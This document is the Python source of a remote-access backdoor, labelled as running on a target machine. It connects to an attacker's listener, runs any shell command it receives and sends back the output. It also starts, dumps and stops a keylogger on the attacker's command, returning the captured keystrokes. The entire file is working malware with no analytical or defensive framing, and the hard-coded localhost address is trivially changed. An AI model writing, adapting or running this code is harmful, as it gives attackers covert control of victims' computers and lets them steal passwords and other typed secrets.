#backdoor that runs on target machine
import socket
import json
import os
import sys
import subprocess
import threading
import time
from keylogger import KeyLogger

ip = '127.0.0.1'
port = 4141

#create a socket with our given IP and port, attempt a connection.
client = socket.socket()
client.connect((ip, port))
print("connected")

#send response back to attacker
def send_response(data):
    jsondata = json.dumps(data)
    client.send(jsondata.encode())

#receive command from attacker
def receive_command():
    data = ''
    while True:
        try:
            data = data + client.recv(1024).decode().rstrip()
            return json.loads(data)
        except ValueError:
            continue

#interpret commands from attacker
def execute_shell():
    while True:
        command = receive_command()
        print(f"command received: {command}")
        if command == 'quit':
            try: keylog.self_destruct()
            except: pass
            send_response("disconnected")
            break

        elif command[:2] == 'cd':
            try:
                #change to the dir in the second part of the command
                os.chdir(command[3:])

            except:#there wasn't anything after "cd"
                pass
                
            finally:#send the current working directory
                send_response(os.getcwd())

        elif command[:12] == 'keylog_start':
            keylog = KeyLogger()
            t = threading.Thread(target=keylog.start)
            t.start()
            send_response("started")

        elif command[:11] == 'keylog_dump':
            try:
                keys = keylog.readkeys()
                send_response(keys)
            except:
                send_response("no keylogs found")

        elif command[:11] == 'keylog_stop':
            keylog.self_destruct()
            send_response("keylog stopped")

        else:
            op = subprocess.Popen(command, shell=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE, stdin=subprocess.PIPE)
            send_response((op.stdout.read() + op.stderr.read()).decode()) 

execute_shell()